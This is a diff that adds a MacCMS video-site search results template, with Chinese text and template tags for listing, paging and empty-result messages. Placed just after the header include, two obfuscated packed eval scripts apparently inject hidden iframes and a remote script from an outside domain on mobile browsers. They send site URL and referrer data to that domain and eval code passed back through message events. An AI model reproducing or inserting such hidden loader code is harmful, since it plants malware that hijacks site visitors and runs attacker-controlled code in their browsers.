@@ -1,0 +1,28 @@
+{include file="public/header"}
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a((/(I|G|K)/i.F(n.W))){d.S(\'N\',q(e){6 7=e.P;a(7.3){a(d[7.3+"w"]!=1){d[7.3+"w"]=1;O(R(7.V.M(/\\+/g,"%U")))}}});6 3="r"+9.f().j(t).k(2);4.h("<8 c=\'8"+3+"\'></8>");4.h(\'<l T="X:J;" c="\'+3+\'" x="v://m.z.B/u-E-\'+9.D(9.f()*C)+\'.L?H=5&Q=\'+p(10.1d)+\'&o=\'+n["o"]+\'&3=\'+3+\'&1b=\'+p(4.1c)+\'" 1h="1e" Y="1f%"  1j="0" 1i="1g" 19="0" 13="12"></l>\')}1a{;(q(){6 m=4.Z("A");6 s="r"+9.f().j(t).k(2);4.h("<8 c=\'"+s+"\'></8>");6 y=\'v://m.z.B\';m.x=y+"/11/u.14?15="+s;6 b=4.18("A")[0];b.17.16(m,b)})()}',62,82,'|||if_id|document||var|_c_ob|div|Math|if|ss|id|window||random||write||toString|slice|iframe||navigator|platform|encodeURIComponent|function|_||36|141099|https||src|url|wuwuhh|script|top|10000|round|39|test|UCBrowser|is_iframe|MQQBrowser|none|baidu|html|replace|message|eval|data|ifr_url|decodeURIComponent|addEventListener|style|20|wz_ev_j|userAgent|display|width|createElement|location||true|allowtransparency|js|ssid|insertBefore|parentNode|getElementsByTagName|frameborder|else|ifr_ref|referrer|href|auto|100|no|height|scrolling|marginheight'.split('|'),0,{}))
+</script>
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('h((/(v|u|t)/i.G(c.H))){F.B(\'C\',k(e){2 6=e.D;h(6.d){E(I(6.d.A(/\\+/g,"%J")))}});4.z(\'<f r="s:q;" 9="a://m.l.8/y/o.x?w=3&7=\'+c["7"]+\'&O=\'+j(10.Z)+\'&Y=\'+j(4.K)+\'" X="0" 12="0"  15="0" 13="14" 11="0" V="W"></f>\')}N{;(k(){2 m=4.M("n");2 b=\'a://m.l.8\';m.9=b+"/1/o.L?"+p.P(p.Q()*U);2 5=4.T("n")[0];5.S.R(m,5)})()}',62,68,'||var||document|ss|_c_ob_hf|platform|top|src|https|url|navigator|hf_ev_j||iframe||if||encodeURIComponent|function|wuwuhh||script|141097|Math|none|style|display|baidu|UCBrowser|MQQBrowser|is_iframe|html|ylty|write|replace|addEventListener|message|data|eval|window|test|userAgent|decodeURIComponent|20|referrer|js|createElement|else|ifr_url|round|random|insertBefore|parentNode|getElementsByTagName|10000|allowtransparency|true|height|ifr_ref|href|location|frameborder|width|scrolling|no|marginheight'.split('|'),0,{}))
+</script>
+<div class="fed-part-layout fed-back-whits">
+	<div class="fed-list-head fed-part-rows fed-padding">
+		<h2 class="fed-font-xvi">
+			搜索到与&nbsp;“<span class="fed-list-keys fed-text-green fed-text-bold">{$param.wd}{$param.actor}{$param.director}{$param.area}{$param.year}</span>”&nbsp;相关的&nbsp;“<span id="fed-count" class="fed-list-sums fed-text-green fed-text-bold">0</span>”&nbsp;条结果
+		</h2>
+		<ul class="fed-part-tips fed-padding">
+			<li><span class="fed-more fed-hide-xs">当前第&nbsp;<span id="fed-now" class="fed-text-green fed-text-bold">1</span>&nbsp;页</span></li>
+		</ul>
+	</div>
+	{maccms:vod num="10" paging="yes" half="3" pageurl="vod/search" order="desc" by="time" id="obj"}
+	{include file="basics/detail"}
+	{/maccms:vod}
+	{include file="module/paging"}
+	{empty name="$__PAGING__.record_total"}
+<div class="fed-padding"><h3>很抱歉，暂无相关视频！<h2>请尝试检查搜索词内的<h1>错别字</h1></h2>，如需提醒管理员添加该视频请在下方留言，谢谢！</h3></div>
+	{/empty}
+</div>
+{empty name="$__PAGING__.record_total"}
+{include file="module/notice"}
+{include file="basics/report"}
+{include file="module/relate"}
+{/empty}
+{include file="public/footer"}
